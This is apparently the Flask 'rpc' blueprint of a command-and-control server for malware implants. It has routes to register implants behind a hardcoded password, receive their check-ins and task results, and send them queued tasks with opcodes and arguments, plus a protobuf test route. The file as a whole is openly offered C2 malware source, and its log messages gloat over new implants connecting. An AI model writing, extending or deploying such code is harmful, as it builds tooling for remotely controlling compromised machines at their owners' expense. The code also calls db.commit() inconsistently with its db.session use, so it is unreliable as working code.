# rpc blueprint

from flask import Blueprint, request , abort 
from implant_pb2 import * 
from database import db
from models import *

rpc = Blueprint("rpc", __name__)

password = "foobar"

@rpc.route("/register", methods=["POST"])
def handle_register():
    print(f'REGISTERING A NEW IMPLANT')
    register = RegisterImplant()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    if register.Password != password:
        abort(404)
    r = make_implant(register)
    db.session.add(r)
    db.commit()
    print("Watch out sexy ;) a New Implant connected!")
    return ""


@rpc.route("/checkin", methods = ["POST"])
def handle_checkin():
    checkin =  Checkin()
    data = request.get_data()
    checkin.ParseFromString(data)
    if checkin.Resp:
        print("Checkin Response: ", checkin.Resp)
        result = handle_task_complete(checkin.GUID, checkin.Resp)
        print("Implant checkin status: ", result)
    

    task = get_task_for_implant(checkin.GUID) 
    if task :
        print(f"Task pulled down for implant: {task}")
        tr = TaskRequest()
        tr.TaskGuid  = task.task_id
        tr.Opcode  = opcodes[task.task_opcode]
        tr.Args = task.task_args
        return  tr.SerializeToString()
        # handle job response 
        # handle new tasks 
    
    return ""

    
    
@rpc.route("/testpb", methods=["POST"])
def handle_pbtest():
    register = RegisterImplant()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    print(register)
    return ""

